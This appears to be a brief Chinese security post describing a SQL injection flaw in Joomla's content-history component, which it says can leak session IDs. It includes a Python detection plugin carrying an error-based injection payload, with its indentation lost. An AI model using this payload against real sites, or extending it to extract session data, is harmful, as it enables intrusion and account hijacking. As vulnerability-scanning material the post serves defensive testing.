joomla漏洞原因:
在该cms的模块models/history.php中的getListQuery()函数没有对参数进行过滤导致注入漏洞。
如图：


可以通过注入从数据库里返回session ID
通过该插件可以检测该漏洞。欢迎 E安全微信公众号：EAQapp


代码：



#!/usr/bin/env python
# -*- coding: utf-8 -*-
def assign(service, arg):
if service == 'joomla':
return True, arg
def audit(arg):
payload = 'index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6275677363616E776B),floor(rand(0)*2))x from information_schema.tables group by x)a)'
target = arg + payload

code, head, res, errcode, _ = curl.curl2(target);
if code== 200 and 'bugscanwk' in res:
security_note(target)
if __name__ == '__main__':
from dummy import *
audit(assign('joomla','http://www.example.com/')[1])
